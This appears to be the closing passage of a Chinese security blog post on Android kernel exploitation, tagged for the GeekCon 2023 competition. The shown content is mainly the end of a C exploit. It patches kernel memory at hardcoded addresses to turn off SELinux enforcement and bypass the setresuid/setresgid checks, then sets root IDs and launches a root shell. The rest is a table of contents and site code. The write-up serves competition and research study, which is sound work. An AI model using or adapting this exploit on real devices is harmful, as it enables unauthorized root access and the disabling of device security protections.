<span class="comment">// make 0xfffffffc20000000 &lt;--&gt; phys_0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// write kernel image</span></span><br><span class="line">    <span class="comment">/* selinux_enforcing*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr = <span class="number">0xFFFFFFC00ACAD8E0</span>;              <span class="comment">// android11上是selinux_state+1的位置，而android12上又无需加1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> selinux_enforcing_addr_new = RE_MAP_ADDR + <span class="number">0x200000</span> + (selinux_enforcing_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;selinux_enforcing_addr_new: 0x%lx\n&quot;</span>, selinux_enforcing_addr_new);</span><br><span class="line">    *(<span class="keyword">char</span>*)selinux_enforcing_addr_new = <span class="number">0x0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;selinux_enforcing_addr_new content: 0x%lx\n&quot;, *(char*)selinux_enforcing_addr_new);</span></span><br><span class="line">    <span class="comment">/* sys_setresuid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr = <span class="number">0xFFFFFFC00815F258</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresuid_if_addr_new = RE_MAP_ADDR + <span class="number">0x200000</span> + (setresuid_if_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid_if_addr_new: 0x%lx\n&quot;</span>,setresuid_if_addr_new);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresuid_if_addr_new+<span class="number">3</span>) = <span class="number">0xB5</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;setresuid_if_addr_new content: 0x%lx\n&quot;,*(unsigned long*)setresuid_if_addr_new);             // 为什么加这个打印会报bus error的错？？</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* sys_setresgid*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr = <span class="number">0xFFFFFFC00815F62C</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> setresgid_if_addr_new = RE_MAP_ADDR + <span class="number">0x200000</span> + (setresgid_if_addr - IMAGE_BASE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresgid_if_addr_new: 0x%lx\n&quot;</span>,setresgid_if_addr_new);</span><br><span class="line">    *(<span class="keyword">char</span> *)(setresgid_if_addr_new+<span class="number">3</span>) = <span class="number">0xB5</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;setresgid_if_addr_new content: 0x%lx\n&quot;,*(unsigned long*)setresgid_if_addr_new);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresuid\n&quot;</span>);</span><br><span class="line">    setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;setresgid\n&quot;</span>);</span><br><span class="line">    setresgid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/system/bin/sh\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/system/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;exit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>










</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/kernel-pwn/">kernel pwn</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/android/">android</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://blingblingxuanxuan.github.io/tags/GeekCon-2023/">GeekCon 2023</a></span></div><div class="post-share"><div class="social-share" data-sites="qq, weibo, wechat, twitter">Share to: </div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/09/08/230908-arm64-memcpy-template/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">arm64 linux内核中memcpy是如何运作的？</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/09/03/230903-geekcon-prepare/"><span class="paginator-prev__text">GeekCon AVSS 2023 初赛示例题 CVE-2015-3636</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">
          漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">
          漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#android-7"><span class="toc-number">2.1.</span> <span class="toc-text">
          android 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#android-8"><span class="toc-number">2.2.</span> <span class="toc-text">
          android 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#android-9"><span class="toc-number">2.3.</span> <span class="toc-text">
          android 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#android-10"><span class="toc-number">2.4.</span> <span class="toc-text">
          android 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#android-11"><span class="toc-number">2.5.</span> <span class="toc-text">
          android 11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E5%86%99"><span class="toc-number">2.5.1.</span> <span class="toc-text">
          任意地址写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E7%BA%A7%E9%A1%B5%E8%A1%A8%E5%AF%B9%E5%BA%94%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%EF%BC%88X%EF%BC%89"><span class="toc-number">2.5.2.</span> <span class="toc-text">
          写一级页表对应虚拟地址（X）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E7%BA%A7%E9%A1%B5%E8%A1%A8%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%AF%B9%E5%BA%94%E9%A1%B5%E8%A1%A8%E9%A1%B9%EF%BC%88%E2%9C%94%EF%BC%89"><span class="toc-number">2.5.3.</span> <span class="toc-text">
          写一级页表虚拟地址对应页表项（✔）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#android-12"><span class="toc-number">2.6.</span> <span class="toc-text">
          android 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#android-13"><span class="toc-number">2.7.</span> <span class="toc-text">
          android 13</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/littledog.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">79</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">5</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">66</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>